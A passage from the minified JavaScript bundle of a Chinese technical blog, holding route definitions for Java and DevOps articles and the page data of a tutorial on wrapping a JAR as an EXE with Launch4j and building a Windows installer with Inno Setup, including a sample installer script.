实现多数据源.html",redirect:"/spring/spring-boot/203/"},{name:"v-61e74299",path:"/spring/spring-boot/204/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-61e74299").then(t)}},{path:"/spring/spring-boot/204/index.html",redirect:"/spring/spring-boot/204/"},{path:"/00.java/20.Spring/23.springboot/204.SpringBoot MyBatis 动态建表.html",redirect:"/spring/spring-boot/204/"},{name:"v-f7296352",path:"/spring/spring-boot/205/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-f7296352").then(t)}},{path:"/spring/spring-boot/205/index.html",redirect:"/spring/spring-boot/205/"},{path:"/00.java/20.Spring/23.springboot/205.Spring Boot 集成 Jasypt 3.0.3 配置文件加密.html",redirect:"/spring/spring-boot/205/"},{name:"v-689c946e",path:"/spring/spring-boot/206/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-689c946e").then(t)}},{path:"/spring/spring-boot/206/index.html",redirect:"/spring/spring-boot/206/"},{path:"/00.java/20.Spring/23.springboot/206.Spring Boot 集成 FastDFS.html",redirect:"/spring/spring-boot/206/"},{name:"v-90a50632",path:"/spring/spring-boot/207/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-90a50632").then(t)}},{path:"/spring/spring-boot/207/index.html",redirect:"/spring/spring-boot/207/"},{path:"/00.java/20.Spring/23.springboot/207.Spring Boot VUE前后端加解密.html",redirect:"/spring/spring-boot/207/"},{name:"v-4452e22a",path:"/maven/2300/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-4452e22a").then(t)}},{path:"/maven/2300/index.html",redirect:"/maven/2300/"},{path:"/00.java/2300.maven/2300.pom 文件介绍及 parent、properties 标签详解.html",redirect:"/maven/2300/"},{name:"v-13c2056a",path:"/maven/2301/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-13c2056a").then(t)}},{path:"/maven/2301/index.html",redirect:"/maven/2301/"},{path:"/00.java/2300.maven/2301.dependencies 标签详解.html",redirect:"/maven/2301/"},{name:"v-5783fd5e",path:"/maven/2302/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-5783fd5e").then(t)}},{path:"/maven/2302/index.html",redirect:"/maven/2302/"},{path:"/00.java/2300.maven/2302.使用 Nexus3.x 搭建私服.html",redirect:"/maven/2302/"},{name:"v-41b48450",path:"/mybatis/mybatis/300/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-41b48450").then(t)}},{path:"/mybatis/mybatis/300/index.html",redirect:"/mybatis/mybatis/300/"},{path:"/00.java/30.Mybatis/31.mybatis/300.核心功能拆解 工作流程.html",redirect:"/mybatis/mybatis/300/"},{name:"v-6d19a90e",path:"/mybatis/mybatis/301/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-6d19a90e").then(t)}},{path:"/mybatis/mybatis/301/index.html",redirect:"/mybatis/mybatis/301/"},{path:"/00.java/30.Mybatis/31.mybatis/301.核心功能拆解 Plugin插件功能实现.html",redirect:"/mybatis/mybatis/301/"},{name:"v-2504457e",path:"/mybatis/mybatis/302/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-2504457e").then(t)}},{path:"/mybatis/mybatis/302/index.html",redirect:"/mybatis/mybatis/302/"},{path:"/00.java/30.Mybatis/31.mybatis/302.核心功能拆解 一二级缓存原理.html",redirect:"/mybatis/mybatis/302/"},{name:"v-74f21a38",path:"/mybatis/mybatis/303/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-74f21a38").then(t)}},{path:"/mybatis/mybatis/303/index.html",redirect:"/mybatis/mybatis/303/"},{path:"/00.java/30.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存.html",redirect:"/mybatis/mybatis/303/"},{name:"v-9d02e050",path:"/linux/2300/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-9d02e050").then(t)}},{path:"/linux/2300/index.html",redirect:"/linux/2300/"},{path:"/01.运维/2300.linux/2300.Linux 创建用户及权限操作.html",redirect:"/linux/2300/"},{name:"v-541435c6",path:"/linux/2301/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-541435c6").then(t)}},{path:"/linux/2301/index.html",redirect:"/linux/2301/"},{path:"/01.运维/2300.linux/2301.Linux 磁盘操作相关命令.html",redirect:"/linux/2301/"},{name:"v-1308af9d",path:"/linux/2302/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-1308af9d").then(t)}},{path:"/linux/2302/index.html",redirect:"/linux/2302/"},{path:"/01.运维/2300.linux/2302.Linux 文本数据处理工具awk命令.html",redirect:"/linux/2302/"},{name:"v-252f5a65",path:"/linux/2303/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-252f5a65").then(t)}},{path:"/linux/2303/index.html",redirect:"/linux/2303/"},{path:"/01.运维/2300.linux/2303.Linux 定时任务.html",redirect:"/linux/2303/"},{name:"v-8da11b2c",path:"/linux/2304/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-8da11b2c").then(t)}},{path:"/linux/2304/index.html",redirect:"/linux/2304/"},{path:"/01.运维/2300.linux/2304.Linux 命令总结.html",redirect:"/linux/2304/"},{name:"v-62410f40",path:"/linux/2305/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-62410f40").then(t)}},{path:"/linux/2305/index.html",redirect:"/linux/2305/"},{path:"/01.运维/2300.linux/2305.Linux 22端口对外攻击解决.html",redirect:"/linux/2305/"},{name:"v-7dd6a16f",path:"/docker/400/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-7dd6a16f").then(t)}},{path:"/docker/400/index.html",redirect:"/docker/400/"},{path:"/01.运维/40.Docker/400.Docker 概念、命令及Dockerfile介绍.html",redirect:"/docker/400/"},{name:"v-12a39364",path:"/docker/401/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-12a39364").then(t)}},{path:"/docker/401/index.html",redirect:"/docker/401/"},{path:"/01.运维/40.Docker/401.Docker-Compose 命令及基本使用.html",redirect:"/docker/401/"},{name:"v-6ee475a8",path:"/docker/402/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-6ee475a8").then(t)}},{path:"/docker/402/index.html",redirect:"/docker/402/"},{path:"/01.运维/40.Docker/402.Docker私有库的开发.html",redirect:"/docker/402/"},{name:"v-16683504",path:"/jenkins/500/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-16683504").then(t)}},{path:"/jenkins/500/index.html",redirect:"/jenkins/500/"},{path:"/01.运维/50.Jenkins/500.Jenkins(一) 持续集成及Jenkins介绍.html",redirect:"/jenkins/500/"},{name:"v-78cfb480",path:"/jenkins/501/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-78cfb480").then(t)}},{path:"/jenkins/501/index.html",redirect:"/jenkins/501/"},{path:"/01.运维/50.Jenkins/501.Jenkins(二) Jenkins安装和环境配置.html",redirect:"/jenkins/501/"},{name:"v-a5b32138",path:"/jenkins/502/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-a5b32138").then(t)}},{path:"/jenkins/502/index.html",redirect:"/jenkins/502/"},{path:"/01.运维/50.Jenkins/502.Jenkins(三) Jenkins用户管理及凭证.html",redirect:"/jenkins/502/"},{name:"v-45042106",path:"/jenkins/503/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-45042106").then(t)}},{path:"/jenkins/503/index.html",redirect:"/jenkins/503/"},{path:"/01.运维/50.Jenkins/503.Jenkins(四) Maven安装和配置.html",redirect:"/jenkins/503/"},{name:"v-eebfe876",path:"/jenkins/504/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-eebfe876").then(t)}},{path:"/jenkins/504/index.html",redirect:"/jenkins/504/"},{path:"/01.运维/50.Jenkins/504.Jenkins(五) Jenkins构建Maven项目.html",redirect:"/jenkins/504/"},{name:"v-1652c501",path:"/jenkins/505/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-1652c501").then(t)}},{path:"/jenkins/505/index.html",redirect:"/jenkins/505/"},{path:"/01.运维/50.Jenkins/505.Jenkins(六) Jenkins项目构建细节.html",redirect:"/jenkins/505/"},{name:"v-a7c74124",path:"/jenkins/506/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-a7c74124").then(t)}},{path:"/jenkins/506/index.html",redirect:"/jenkins/506/"},{path:"/01.运维/50.Jenkins/506.Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）.html",redirect:"/jenkins/506/"},{name:"v-4b59fa74",path:"/jenkins/507/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-4b59fa74").then(t)}},{path:"/jenkins/507/index.html",redirect:"/jenkins/507/"},{path:"/01.运维/50.Jenkins/507.Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）.html",redirect:"/jenkins/507/"},{name:"v-4d0793a3",path:"/kubernetes/600/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-4d0793a3").then(t)}},{path:"/kubernetes/600/index.html",redirect:"/kubernetes/600/"},{path:"/01.运维/60.Kubernetes/600.kubernetes(一) 概念及介绍.html",redirect:"/kubernetes/600/"},{name:"v-7d7d4816",path:"/kubernetes/601/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-7d7d4816").then(t)}},{path:"/kubernetes/601/index.html",redirect:"/kubernetes/601/"},{path:"/01.运维/60.Kubernetes/601.kubernetes(二) 集群环境搭建.html",redirect:"/kubernetes/601/"},{name:"v-734bf71d",path:"/kubernetes/602/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-734bf71d").then(t)}},{path:"/kubernetes/602/index.html",redirect:"/kubernetes/602/"},{path:"/01.运维/60.Kubernetes/602.kubernetes(三) 资源管理.html",redirect:"/kubernetes/602/"},{name:"v-62470732",path:"/kubernetes/603/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-62470732").then(t)}},{path:"/kubernetes/603/index.html",redirect:"/kubernetes/603/"},{path:"/01.运维/60.Kubernetes/603.kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍.html",redirect:"/kubernetes/603/"},{name:"v-668f65e8",path:"/kubernetes/604/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-668f65e8").then(t)}},{path:"/kubernetes/604/index.html",redirect:"/kubernetes/604/"},{path:"/01.运维/60.Kubernetes/604.kubernetes(五) Pod 介绍及配置.html",redirect:"/kubernetes/604/"},{name:"v-22acaa33",path:"/kubernetes/605/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-22acaa33").then(t)}},{path:"/kubernetes/605/index.html",redirect:"/kubernetes/605/"},{path:"/01.运维/60.Kubernetes/605.kubernetes(六) Pod 生命周期.html",redirect:"/kubernetes/605/"},{name:"v-79aee7c8",path:"/kubernetes/606/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-79aee7c8").then(t)}},{path:"/kubernetes/606/index.html",redirect:"/kubernetes/606/"},{path:"/01.运维/60.Kubernetes/606.kubernetes(七) Pod 调度.html",redirect:"/kubernetes/606/"},{name:"v-43fb77b9",path:"/kubernetes/607/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-43fb77b9").then(t)}},{path:"/kubernetes/607/index.html",redirect:"/kubernetes/607/"},{path:"/01.运维/60.Kubernetes/607.kubernetes(八) Pod 控制器详解.html",redirect:"/kubernetes/607/"},{name:"v-5019f548",path:"/kubernetes/608/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-5019f548").then(t)}},{path:"/kubernetes/608/index.html",redirect:"/kubernetes/608/"},{path:"/01.运维/60.Kubernetes/608.kubernetes(九) Service介绍、类型及使用.html",redirect:"/kubernetes/608/"},{name:"v-21c7009a",path:"/kubernetes/609/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-21c7009a").then(t)}},{path:"/kubernetes/609/index.html",redirect:"/kubernetes/609/"},{path:"/01.运维/60.Kubernetes/609.kubernetes(十) Ingress介绍及使用.html",redirect:"/kubernetes/609/"},{name:"v-4fcd330d",path:"/kubernetes/610/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-4fcd330d").then(t)}},{path:"/kubernetes/610/index.html",redirect:"/kubernetes/610/"},{path:"/01.运维/60.Kubernetes/610.kubernetes(十一) 数据存储（挂载卷管理）.html",redirect:"/kubernetes/610/"},{name:"v-6634edc1",path:"/kubernetes/611/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-6634edc1").then(t)}},{path:"/kubernetes/611/index.html",redirect:"/kubernetes/611/"},{path:"/01.运维/60.Kubernetes/611.kubernetes(十二) 安全认证.html",redirect:"/kubernetes/611/"},{name:"v-a2835a8a",path:"/kubernetes/612/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-a2835a8a").then(t)}},{path:"/kubernetes/612/index.html",redirect:"/kubernetes/612/"},{path:"/01.运维/60.Kubernetes/612.kubernetes(十三) DashBoard.html",redirect:"/kubernetes/612/"},{name:"v-59de6d20",path:"/",component:Gs,beforeEnter:function(n,e,t){Hi("Layout","v-59de6d20").then(t)}},{path:"/index.html",redirect:"/"},{path:"*",component:Gs}],Ks={title:"BigUncle技术博客",description:"技术博客",base:"/",headTags:[["link",{rel:"icon",href:"/favicon.ico"}],["meta",{name:"viewport",content:"width=device-width,initial-scale=1,user-scalable=no"}]],pages:[{title:"JVM",frontmatter:{title:"JVM",date:"2023-06-25T09:22:36.000Z",permalink:"/java/100/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/10.java/100.java.html",relativePath:"00.java/10.java/100.java.md",key:"v-4a355d2a",path:"/java/100/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"jar 打包成.exe可执行文件",frontmatter:{title:"jar 打包成.exe可执行文件",date:"2023-06-25T09:22:36.000Z",permalink:"/java/101/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/10.java/101.%E6%89%93%E5%8C%85exe%E7%A8%8B%E5%BA%8F.html",relativePath:"00.java/10.java/101.打包exe程序.md",key:"v-104240f2",path:"/java/101/",headers:[{level:2,title:"使用 Launch4j",slug:"使用-launch4j",normalizedTitle:"使用 launch4j",charIndex:33},{level:3,title:"Basic",slug:"basic",normalizedTitle:"basic",charIndex:1575},{level:3,title:"JRE",slug:"jre",normalizedTitle:"jre",charIndex:697},{level:3,title:"",slug:"",normalizedTitle:"",charIndex:0},{level:2,title:"使用 Inno Setup",slug:"使用-inno-setup",normalizedTitle:"使用 inno setup",charIndex:1794},{level:3,title:"Setup",slug:"setup",normalizedTitle:"setup",charIndex:52},{level:3,title:"Dirs",slug:"dirs",normalizedTitle:"dirs",charIndex:2235},{level:3,title:"Files",slug:"files",normalizedTitle:"files",charIndex:1998},{level:3,title:"Registry",slug:"registry",normalizedTitle:"registry",charIndex:2422},{level:3,title:"Run",slug:"run",normalizedTitle:"run",charIndex:2600}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"使用 Launch4j Basic JRE  使用 Inno Setup Setup Dirs Files Registry Run",content:'要将一个 Java JAR 文件打包成可执行的 EXE 文件，可以使用 Launch4j 和 Inno Setup 来完成这个任务。\n\nLaunch4j 用于将 Java 应用程序打包为本机可执行文件（通常为 EXE 文件）的工具。它的主要作用是创建一个包装器，允许用户像运行本机 Windows 应用程序一样运行 Java 应用程序，而无需手动启动 Java 虚拟机（JVM）。 Launch4j 是一个免费的开源项目，它遵循 GNU General Public License（GPL）许可证。这意味着你可以免费使用 Launch4j 来创建可执行文件，包括商业用途。你可以从 Launch4j 的官方网站下载并使用它，无需支付许可费用。官网地址\n\nLaunch4j 功能有：\n\n * 创建本机可执行文件：Launch4j 允许你将你的 Java 应用程序打包为一个本机的可执行文件（通常是 EXE 文件）。这意味着用户可以双击该文件来运行你的 Java 应用程序，而无需手动打开命令行或 JVM。\n * 自定义可执行文件属性：你可以通过 Launch4j 配置可执行文件的各种属性，如程序图标、文件版本信息、标题等。这有助于使你的 Java 应用程序看起来像本机 Windows 应用程序。\n * 支持类路径和 JAR 文件：Launch4j 允许你指定应用程序的类路径和关联的 JAR 文件，以确保你的 Java 应用程序能够正常运行。\n * 自动检测 Main-Class：它可以自动检测你的 JAR 文件中的 Main-Class，从而无需手动指定应用程序的入口点。\n * 支持 JRE 选项：你可以选择将 JRE（Java 运行时环境）打包到生成的可执行文件中，从而用户无需安装 JRE 即可运行你的应用程序。\n * 跨平台兼容性：生成的可执行文件通常只能在 Windows 上运行，但 Launch4j 可以在 Windows 上创建用于其他平台的包装器，例如 Linux 或 macOS。\n\nInno Setup 本身不能直接将 JAR 文件打包成 EXE 文件。所以我们要先使用 Launch4j 把 jar 打包成一个 exe 格式的可执行程序。Inno Setup 是一个免费的开源安装制作工具，它遵循许可证允许免费使用，包括商业用途。Inno Setup 的主要作用是创建用于安装和卸载 Windows 应用程序的安装程序。官网地址\n\nInno Setup 功能有：\n\n * 创建自定义安装程序：Inno Setup 允许开发人员创建定制的、易于使用的安装程序，用于将他们的应用程序部署到 Windows 操作系统上。你可以定义安装过程的各个方面，包括文件复制、注册表项、快捷方式、开始菜单项等。\n * 支持多种安装任务：Inno Setup 支持各种各样的安装任务，包括简单的文件复制，注册表设置，创建快捷方式，以及执行自定义脚本和任务。这使得你可以轻松地自定义安装过程，以满足你的应用程序的特定需求。\n * 脚本化：Inno Setup 使用基于脚本的语言来定义安装过程。这意味着你可以编写脚本来描述安装程序的行为，使其非常灵活。Inno Setup 使用类似于 Pascal 的脚本语言。\n * 多语言支持：Inno Setup 支持多种语言，允许你为不同的用户群体创建多语言安装程序，以提供本地化的安装和卸载体验。\n * 卸载支持：Inno Setup 不仅可以创建安装程序，还可以生成卸载程序，允许用户从他们的计算机上卸载你的应用程序。\n\n\n# 使用 Launch4j\n\nLaunch4j 把 jar 包装成 .exe 程序还是有所局限的，比如启动方式只能是 java -jar，如果配合混淆就没有办法\n\n\n# Basic\n\n在这里配置路径等信息\n\n\n\nOutput file: 填写把 jar 打成.exe 程序的输出路径\njar：选择自己要打包的 jar\n\n\n# JRE\n\n在这里配置 JVM，JDK 版本等信息\n\n\n\nJRE paths：不需要我们填\nMin JRE version：最低 JDK 版本\nMax JRE version：最高 JDK 版本\nJVM option：设置 JVM 启动参数\n\n\n#\n\n设置 console\n\n\n\n# 使用 Inno Setup\n\nInno Setup 还是有些难度的，需要学习里面的各个关键字，回调，事件等，才能掌握 Inno Setup 的使用\n\n以下贴一个简单的 Inno Setup 示例\n\n;配置和描述安装程序的整体设置和行为\n[Setup]\n; 应用名称\nAppName=Easy-Manager-Tool\n; 应用版本\nAppVersion=1.0\n; 默认安装目录 {pf}为 Program Files 这个路径是类似于 C:\\Program Files 的形式\nDefaultDirName={pf}\\emt\n; 应用输出到文件路径\nOutputDir=C:\\Users\\User\\Desktop\\tool\\gen\n; 输出文件的名称\nOutputBaseFilename=emt\n; 指定应用程序的发布者或公司名称\nAppPublisher=\n; 应用程序发布者的网站或URL\nAppPublisherURL=\n\n; 创建目录 {app} 当表应用所在的路径\n[Dirs]\nName: "{app}\\go"; Permissions: everyone-full\n\n; 添加文件\n[Files]\nSource: "C:\\Users\\User\\Desktop\\build\\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs\n\n; 注册表\n[Registry]\nRoot: HKLM; Subkey: "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"; ValueType: string; ValueName: "Path"; ValueData: "{olddata};{app}\\jdk\\bin"\n\n; 运行脚本\n[Run]\nFilename: "{sys}\\cmd.exe"; Parameters: "/C setx PATH ""{app}\\go\\bin;%PATH%"""; Flags: runasoriginaluser; StatusMsg: "Setting PATH for Go..."; Check: not Is64BitInstallMode\nFilename: "{app}\\runBuild.bat"; Description: "runBuild.bat";\nFilename: "cmd.exe"; Parameters: "/c setx PATH ""%PATH%;{app}\\jdk\\bin"" /m"; Flags: runhidden; WorkingDir: {app}; StatusMsg: "Updating PATH environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Setup\n\n用于配置和描述安装程序的整体设置和行为。在 [Setup] 部分中，你可以指定各种安装程序的属性，例如应用程序名称、版本号、安装目录、输出目录等。以下是 [Setup] 可以描述的一些重要内容：\n\n * AppName：这个选项用于指定安装程序的应用程序名称。它将在安装过程中显示给用户，通常用于在开始菜单、卸载项等位置显示应用程序的名称。\n * AppVersion：用于定义安装程序的版本号。这可以是你的应用程序的实际版本号，以帮助用户了解安装的内容。\n * DefaultDirName：指定默认的安装目录。可以使用预定义的常量（如 {pf} 代表 Program Files 目录），或者指定一个具体的路径。\n * OutputDir：定义生成安装程序的输出目录。这是指定生成的安装文件（通常是 .exe 文件）将被保存的位置。\n * OutputBaseFilename：指定生成的安装程序的文件名，通常是一个 .exe 文件。这将是用户运行的实际安装程序文件的名称。\n * AppPublisher：用于指定应用程序的发布者或公司名称，它将在安装过程中显示。\n * AppPublisherURL：可用于提供应用程序发布者的网站或 URL，这也将在安装过程中显示。\n * AppSupportURL：可以包含支持或帮助信息的 URL。\n * AppUpdatesURL：如果有关于应用程序更新的信息或 URL，可以在这里指定。\n * AppMutex：用于指定应用程序的互斥体名称，以确保在安装过程中只能运行一个实例。\n * DefaultGroupName：定义开始菜单中应用程序快捷方式的默认组名。\n * AllowUNCPath：指定是否允许安装到 UNC 路径（网络共享路径）。\n * UninstallDisplayIcon：定义卸载程序的显示图标。\n * UninstallDisplayName：指定卸载程序的显示名称。\n * UninstallString：定义卸载程序的执行命令。\n\n\n# Dirs\n\n用于定义在用户计算机上创建的目录结构。通过 [Dirs] 部分，你可以指定要在目标计算机上创建的目录，以便在安装过程中将文件复制到这些目录中。以下是 [Dirs] 可以描述的内容：\n\n 1. 目录名称：在 [Dirs] 部分中，你可以列出要创建的目录的名称。这些目录名称通常是相对于安装目录（由 [Setup] 部分的 DefaultDirName 指定）的相对路径。\n 2. Permissions：你可以为每个目录指定权限，例如读、写、执行权限。这允许你控制用户是否可以访问或修改这些目录中的文件。\n 3. Subdirectories：你可以定义子目录，以便在目录创建时同时创建子目录。这有助于构建复杂的目录结构\n\n\n# Files\n\n用于指定要在安装过程中包含的文件和它们的安装目标。通过 [Files] 部分，你可以定义要复制到目标计算机上的文件、文件的源路径和文件的目标路径，以及其他文件相关的属性。以下是 [Files] 可以描述的内容：\n\n * Source：这个字段指定了要复制的文件的源路径。你可以指定完整的文件路径，也可以使用通配符来包括多个文件。\n * DestDir：用于指定文件的目标目录。这是文件在用户计算机上的最终安装位置。\n * DestName：指定文件在目标计算机上的名称。这可以是与源文件不同的名称。\n * Check：这个字段允许你定义文件的检查方法，以确保文件在复制到目标计算机上时没有被更改或损坏。\n * Permissions：你可以为每个文件定义权限，包括文件的读、写、执行权限。这允许你控制用户对文件的访问权限。\n * Attribs：允许你为文件定义属性，如只读、隐藏等。\n * FontInstall：如果你的安装程序包含字体文件，你可以使用这个字段来安装字体文件并注册它们。\n * Flags：用于指定与文件相关的特定标志，例如创建快捷方式。\n\n\n# Registry\n\n用于在 Windows 注册表中创建、修改或删除键和值。通过 [Registry] 部分，你可以配置你的安装程序在用户计算机上创建注册表项，以存储应用程序的配置信息、关联文件扩展、文件关联等等。以下是 [Registry] 可以描述的内容：\n\n * Root：指定注册表项的根键，通常是 HKEY_LOCAL_MACHINE 或 HKEY_CURRENT_USER。不同的根键对应不同的部分，例如 HKEY_LOCAL_MACHINE 用于系统范围的设置，而 HKEY_CURRENT_USER 用于当前用户的设置。\n * Subkey：指定注册表项的子键路径。这是注册表中的目标位置。\n * ValueName：定义注册表值的名称。这可以是一个字符串，通常用于存储应用程序的配置信息。\n * ValueType：指定注册表值的类型，如字符串、整数等。\n * ValueData：定义注册表值的数据。这是实际的值，可以是文本、数字等。\n * Flags：用于指定注册表项和值的属性，例如创建、删除、覆盖等。\n * Permissions：你可以定义注册表项的权限，以确保只有具有适当权限的用户才能访问或修改注册表项。\n\n\n# Run\n\n用于在安装过程中指定要运行的可执行文件、脚本或其他程序。通过 [Run] 部分，你可以配置安装程序在安装完成后或卸载程序时执行的操作。以下是 [Run] 可以描述的内容：\n\n * Filename：指定要运行的文件的路径，这可以是一个可执行文件（.exe）、脚本（.bat、.cmd、.vbs 等）或其他程序。\n * Parameters：定义要传递给运行文件的参数或命令行参数。这允许你向运行的程序传递额外的信息。\n * WorkingDir：指定运行文件时的工作目录。这是运行文件所在的目录。\n * Description：提供一个可选的描述，以便在安装过程中显示或记录此操作。\n * Flags：用于指定运行操作的标志，例如是否等待运行的程序完成。\n * StatusMsg：定义在执行此操作时要显示给用户的状态消息。',normalizedContent:'要将一个 java jar 文件打包成可执行的 exe 文件，可以使用 launch4j 和 inno setup 来完成这个任务。\n\nlaunch4j 用于将 java 应用程序打包为本机可执行文件（通常为 exe 文件）的工具。它的主要作用是创建一个包装器，允许用户像运行本机 windows 应用程序一样运行 java 应用程序，而无需手动启动 java 虚拟机（jvm）。 launch4j 是一个免费的开源项目，它遵循 gnu general public license（gpl）许可证。这意味着你可以免费使用 launch4j 来创建可执行文件，包括商业用途。你可以从 launch4j 的官方网站下载并使用它，无需支付许可费用。官网地址\n\nlaunch4j 功能有：\n\n * 创建本机可执行文件：launch4j 允许你将你的 java 应用程序打包为一个本机的可执行文件（通常是 exe 文件）。这意味着用户可以双击该文件来运行你的 java 应用程序，而无需手动打开命令行或 jvm。\n * 自定义可执行文件属性：你可以通过 launch4j 配置可执行文件的各种属性，如程序图标、文件版本信息、标题等。这有助于使你的 java 应用程序看起来像本机 windows 应用程序。\n * 支持类路径和 jar 文件：launch4j 允许你指定应用程序的类路径和关联的 jar 文件，以确保你的 java 应用程序能够正常运行。\n * 自动检测 main-class：它可以自动检测你的 jar 文件中的 main-class，从而无需手动指定应用程序的入口点。\n * 支持 jre 选项：你可以选择将 jre（java 运行时环境）打包到生成的可执行文件中，从而用户无需安装 jre 即可运行你的应用程序。\n * 跨平台兼容性：生成的可执行文件通常只能在 windows 上运行，但 launch4j 可以在 windows 上创建用于其他平台的包装器，例如 linux 或 macos。\n\ninno setup 本身不能直接将 jar 文件打包成 exe 文件。所以我们要先使用 launch4j 把 jar 打包成一个 exe 格式的可执行程序。inno setup 是一个免费的开源安装制作工具，它遵循许可证允许免费使用，包括商业用途。inno setup 的主要作用是创建用于安装和卸载 windows 应用程序的安装程序。官网地址\n\ninno setup 功能有：\n\n * 创建自定义安装程序：inno setup 允许开发人员创建定制的、易于使用的安装程序，用于将他们的应用程序部署到 windows 操作系统上。你可以定义安装过程的各个方面，包括文件复制、注册表项、快捷方式、开始菜单项等。\n * 支持多种安装任务：inno setup 支持各种各样的安装任务，包括简单的文件复制，注册表设置，创建快捷方式，以及执行自定义脚本和任务。这使得你可以轻松地自定义安装过程，以满足你的应用程序的特定需求。\n * 脚本化：inno setup 使用基于脚本的语言来定义安装过程。这意味着你可以编写脚本来描述安装程序的行为，使其非常灵活。inno setup 使用类似于 pascal 的脚本语言。\n * 多语言支持：inno setup 支持多种语言，允许你为不同的用户群体创建多语言安装程序，以提供本地化的安装和卸载体验。\n * 卸载支持：inno setup 不仅可以创建安装程序，还可以生成卸载程序，允许用户从他们的计算机上卸载你的应用程序。\n\n\n# 使用 launch4j\n\nlaunch4j 把 jar 包装成 .exe 程序还是有所局限的，比如启动方式只能是 java -jar，如果配合混淆就没有办法\n\n\n# basic\n\n在这里配置路径等信息\n\n\n\noutput file: 填写把 jar 打成.exe 程序的输出路径\njar：选择自己要打包的 jar\n\n\n# jre\n\n在这里配置 jvm，jdk 版本等信息\n\n\n\njre paths：不需要我们填\nmin jre version：最低 jdk 版本\nmax jre version：最高 jdk 版本\njvm option：设置 jvm 启动参数\n\n\n#\n\n设置 console\n\n\n\n# 使用 inno setup\n\ninno setup 还是有些难度的，需要学习里面的各个关键字，回调，事件等，才能掌握 inno setup 的使用\n\n以下贴一个简单的 inno setup 示例\n\n;配置和描述安装程序的整体设置和行为\n[setup]\n; 应用名称\nappname=easy-manager-tool\n; 应用版本\nappversion=1.0\n; 默认安装目录 {pf}为 program files 这个路径是类似于 c:\\program files 的形式\ndefaultdirname={pf}\\emt\n; 应用输出到文件路径\noutputdir=c:\\users\\user\\desktop\\tool\\gen\n; 输出文件的名称\noutputbasefilename=emt\n; 指定应用程序的发布者或公司名称\napppublisher=\n; 应用程序发布者的网站或url\napppublisherurl=\n\n; 创建目录 {app} 当表应用所在的路径\n[dirs]\nname: "{app}\\go"; permissions: everyone-full\n\n; 添加文件\n[files]\nsource: "c:\\users\\user\\desktop\\build\\*"; destdir: "{app}"; flags: ignoreversion recursesubdirs createallsubdirs\n\n; 注册表\n[registry]\nroot: hklm; subkey: "system\\currentcontrolset\\control\\session manager\\environment"; valuetype: string; valuename: "path"; valuedata: "{olddata};{app}\\jdk\\bin"\n\n; 运行脚本\n[run]\nfilename: "{sys}\\cmd.exe"; parameters: "/c setx path ""{app}\\go\\bin;%path%"""; flags: runasoriginaluser; statusmsg: "setting path for go..."; check: not is64bitinstallmode\nfilename: "{app}\\runbuild.bat"; description: "runbuild.bat";\nfilename: "cmd.exe"; parameters: "/c setx path ""%path%;{app}\\jdk\\bin"" /m"; flags: runhidden; workingdir: {app}; statusmsg: "updating path environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# setup\n\n用于配置和描述安装程序的整体设置和行为。在 [setup] 